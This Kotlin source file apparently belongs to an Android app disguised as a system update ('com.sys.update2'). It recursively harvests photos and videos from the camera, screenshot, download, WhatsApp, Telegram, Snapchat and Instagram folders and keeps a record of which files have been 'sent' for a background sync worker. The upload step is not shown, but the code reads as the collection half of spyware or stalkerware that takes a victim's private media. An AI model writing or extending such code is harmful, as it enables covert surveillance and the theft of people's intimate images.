// language: Kotlin, file: MediaScanner.kt
// *الفلترة بتشيل أي ext صوتي — الصور والفيديو فقط*
// *isSentByKey/markSentByKey تُستخدم من SyncWorker*

package com.sys.update2

import android.content.Context
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

object MediaScanner {

    private const val MAX_FILE_MB = 500L
    private const val PREFS_NAME  = "media_scanner_prefs"
    private const val KEY_SENT    = "sent_files"

    // ⭐ كل الامتدادات الصوتية لمنعها نهائياً
    private val AUDIO_EXTS = setOf(
        "mp3", "wav", "ogg", "m4a", "aac", "flac", "opus", "amr",
        "3gp", "oga", "wma", "aiff", "aif", "alac", "mid", "midi",
        "ape", "wv", "tta", "mka", "ra", "ram", "caf", "m4b", "m4p"
    )

    private fun fmt(t: Long) =
        SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date(t))

    data class MediaFile(
        val path: String,
        val name: String,
        val size: Long,
        val lastModified: Long,
        val mime: String
    )

    // ==================== الفحص ====================

    fun scanImages(): List<MediaFile> =
        scanByExtension(
            listOf("jpg", "jpeg", "png", "gif", "webp", "bmp", "heic", "heif", "tiff", "raw")
        ).sortedByDescending { it.lastModified }

    fun scanVideos(): List<MediaFile> =
        scanByExtension(
            listOf("mp4", "mkv", "avi", "mov", "webm", "flv", "wmv", "m4v", "mpeg", "mpg", "ts")
        ).sortedByDescending { it.lastModified }

    // ==================== منع التكرار ====================

    fun isSent(context: Context, mf: MediaFile): Boolean =
        isSentByKey(context, key(mf))

    fun markSent(context: Context, mf: MediaFile) =
        markSentByKey(context, key(mf))

    fun isSentByKey(context: Context, k: String): Boolean {
        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        return prefs.getStringSet(KEY_SENT, emptySet())!!.contains(k)
    }

    fun markSentByKey(context: Context, k: String) {
        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        val sent  = prefs.getStringSet(KEY_SENT, emptySet())!!.toMutableSet()
        sent += k
        prefs.edit().putStringSet(KEY_SENT, sent).apply()
    }

    fun buildKey(path: String, size: Long, lastModified: Long): String =
        "$path|$size|$lastModified"

    private fun key(mf: MediaFile): String =
        buildKey(mf.path, mf.size, mf.lastModified)

    fun reset(context: Context) {
        context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            .edit().remove(KEY_SENT).apply()
    }

    fun isAudioExt(ext: String): Boolean =
        ext.lowercase(Locale.US) in AUDIO_EXTS

    fun isAudioMime(mime: String?): Boolean =
        mime?.startsWith("audio/", ignoreCase = true) == true

    fun isForbidden(path: String, name: String, mime: String?): Boolean {
        val ext = name.substringAfterLast('.', "").lowercase(Locale.US)
        if (isAudioExt(ext)) return true
        if (isAudioMime(mime)) return true
        val p = path.lowercase(Locale.US)
        for (a in AUDIO_EXTS) {
            if (p.endsWith(".$a")) return true
        }
        return false
    }

    // ==================== المسح الداخلي ====================

    private fun scanByExtension(extensions: List<String>): List<MediaFile> {
        val result = mutableListOf<MediaFile>()
        val roots = listOf(
            File("/storage/emulated/0/DCIM/Camera"),
            File("/storage/emulated/0/DCIM/Screenshots"),
            File("/storage/emulated/0/Pictures/Screenshots"),
            File("/storage/emulated/0/Pictures/Camera"),
            File("/storage/emulated/0/DCIM"),
            File("/storage/emulated/0/Pictures"),
            File("/storage/emulated/0/Download"),
            File("/storage/emulated/0/Documents"),
            File("/storage/emulated/0/Movies"),
            File("/storage/emulated/0/WhatsApp/Media"),
            File("/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media"),
            File("/storage/emulated/0/Telegram"),
            File("/storage/emulated/0/Android/media/org.telegram.messenger"),
            File("/storage/emulated/0/Snapchat"),
            File("/storage/emulated/0/Instagram"),
            File("/storage/emulated/0/Android/media/com.instagram.android"),
        )
        for (root in roots) {
            walk(root, extensions, result, depth = 0, maxDepth = 12, limit = 20000)
        }
        return result.distinctBy { it.path }
    }

    private fun walk(
        dir: File?,
        extensions: List<String>,
        out: MutableList<MediaFile>,
        depth: Int,
        maxDepth: Int,
        limit: Int
    ) {
        if (dir == null || !dir.exists() || !dir.isDirectory) return
        if (depth > maxDepth || out.size >= limit) return

        val children = try { dir.listFiles() } catch (_: Exception) { null } ?: return
        for (f in children) {
            if (out.size >= limit) return
            try {
                if (f.isDirectory) {
                    if (f.name.startsWith(".")) continue
                    walk(f, extensions, out, depth + 1, maxDepth, limit)
                } else {
                    val ext = f.extension.lowercase(Locale.US)
                    if (ext in extensions && ext !in AUDIO_EXTS) {
                        val sizeBytes = f.length()
                        val sizeMb = sizeBytes / (1024 * 1024)
                        if (sizeBytes > 0L && sizeMb <= MAX_FILE_MB) {
                            out += MediaFile(
                                path = f.absolutePath,
                                name = f.name,
                                size = sizeBytes,
                                lastModified = f.lastModified(),
                                mime = guessMime(ext)
                            )
                        }
                    }
                }
            } catch (_: Exception) {}
        }
    }

    private fun guessMime(ext: String): String = when (ext) {
        "jpg", "jpeg"  -> "image/jpeg"
        "png"          -> "image/png"
        "gif"          -> "image/gif"
        "webp"         -> "image/webp"
        "bmp"          -> "image/bmp"
        "heic", "heif" -> "image/heic"
        "tiff", "tif"  -> "image/tiff"
        "raw"          -> "image/x-raw"
        "mp4", "m4v"   -> "video/mp4"
        "mkv"          -> "video/x-matroska"
        "avi"          -> "video/x-msvideo"
        "mov"          -> "video/quicktime"
        "webm"         -> "video/webm"
        "flv"          -> "video/x-flv"
        "wmv"          -> "video/x-ms-wmv"
        "mpeg", "mpg"  -> "video/mpeg"
        "ts"           -> "video/mp2t"
        else           -> "application/octet-stream"
    }

    fun toJson(mf: MediaFile): JSONObject = JSONObject().apply {
        put("type", "media")
        put("path", mf.path)
        put("name", mf.name)
        put("size", mf.size)
        put("modified", fmt(mf.lastModified))
        put("mime", mf.mime)
    }
}
